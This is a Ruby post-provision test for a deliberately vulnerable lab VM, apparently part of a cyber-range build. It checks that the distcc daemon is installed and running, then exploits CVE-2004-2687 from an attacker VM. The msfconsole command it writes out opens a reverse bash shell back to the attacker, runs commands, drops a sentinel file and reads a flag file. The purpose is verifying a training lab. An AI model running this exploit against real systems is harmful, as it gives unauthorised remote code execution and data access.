require_relative '../../../../../lib/post_provision_test'

# Post-provision test for the DistCC Daemon Command Execution vulnerability
# (CVE-2004-2687, exploit/unix/misc/distcc_exec).
#
# Tiers:
#   1  distccd is installed on the target.
#   2  the distcc daemon is listening (port 3632).
#   3  a real exploit from the attacker VM achieves remote command execution.
#
# Tier 3 (Phase 1C) is the first exploit test driven from a second VM: it runs
# Metasploit's distcc_exec module on the "attacker" system (a Kali/MSF box) in
# the same project, against this target's IP, and proves RCE by having the
# payload drop a sentinel file that we then confirm on the target over its own
# guest agent. If there is no attacker system (e.g. a single-VM module run) the
# tier-3 checks SKIP, so the module test still works on its own.
class DistCCExecTest < PostProvisionTest
  ATTACKER = 'attacker'.freeze
  MSF_MODULE = 'exploit/unix/misc/distcc_exec'.freeze

  def initialize
    self.module_name = 'distcc_exec'
    self.module_path = get_module_path(__FILE__)
    super
    self.port = 3632
  end

  def test_module
    super

    # Tier 1 — installed on the target.
    test_command_succeeds('distccd installed', 'command -v distccd', tier: 1)

    # Tier 2 — daemon listening on the target.
    test_service_up(tier: 2)

    # Tier 3 — exploit from the attacker VM.
    test_exploit_from_attacker
  end

  private

  def test_exploit_from_attacker
    name = 'distcc exploit (msf from attacker)'

    unless proxmox?
      skip_check(name, 'Exploit test only runs on the Proxmox pipeline', tier: 3)
      return
    end
    unless system_present?(ATTACKER)
      skip_check(name, "No '#{ATTACKER}' system in this project; tier-3 exploit skipped", tier: 3)
      return
    end

    target_ip = system_ip          # this (target) system's IP, via its guest agent
    attacker_ip = other_system_ip(ATTACKER)
    if target_ip.nil? || attacker_ip.nil?
      skip_check(name, "Could not resolve target (#{target_ip.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: 3)
      return
    end

    nonce = "#{Time.now.to_i}_#{rand(100000)}"
    sentinel = "/tmp/distcc_pwned_#{nonce}"

    # One-shot msfconsole run on the attacker. reverse_bash payload, backgrounded
    # session, then run a command on the session: prove exec (id), tag the host,
    # drop the sentinel on the target, and try to read the leaked flag.
    msf = <<~MSF.gsub("\n", ' ')
      msfconsole -q -x "
      use #{MSF_MODULE};
      set RHOSTS #{target_ip};
      set RPORT #{self.port};
      set LHOST #{attacker_ip};
      set LPORT 4444;
      set PAYLOAD cmd/unix/reverse_bash;
      set ExitOnSession false;
      exploit -z -j;
      sleep 25;
      sessions -l;
      sessions -C 'echo DISTCC_RCE_OK; id; uname -n; touch #{sentinel}; cat /home/distccd/* 2>/dev/null';
      sleep 5;
      exit -y
      "
    MSF

    result = run_on_system(ATTACKER, msf, timeout: 600)
    out = "#{result[:stdout]}\n#{result[:stderr]}"
    add_evidence('msf_output', "echo #{Shellwords.escape(out[-4000..-1] || out)}")

    rce_marker = out.include?('DISTCC_RCE_OK') && out =~ /uid=\d+/

    # Independent confirmation: did the exploit create the sentinel on the target?
    sentinel_check = run_vagrant_ssh("test -e #{sentinel} && echo SENTINEL_PRESENT", timeout: 30)
    sentinel_present = sentinel_check[:stdout].include?('SENTINEL_PRESENT')

    if sentinel_present
      detail = "RCE confirmed: msf distcc_exec from #{ATTACKER} (#{attacker_ip}) created #{sentinel} on the target (#{target_ip})."
      detail += ' (session command output also seen)' if rce_marker
      pass_check(name, detail, tier: 3)
    elsif rce_marker
      # Session ran a command but the sentinel wasn't found on the target — still
      # proves exec, but flag it as partial so a human looks.
      pass_check(name, "RCE confirmed via msf session output (uid= seen) from #{ATTACKER}, though sentinel #{sentinel} was not found on the target.", tier: 3)
    else
      fail_check(name, "Exploit did not confirm RCE: no sentinel on target and no session command output. See msf_output evidence.", tier: 3)
    end
  end
end

DistCCExecTest.new.run
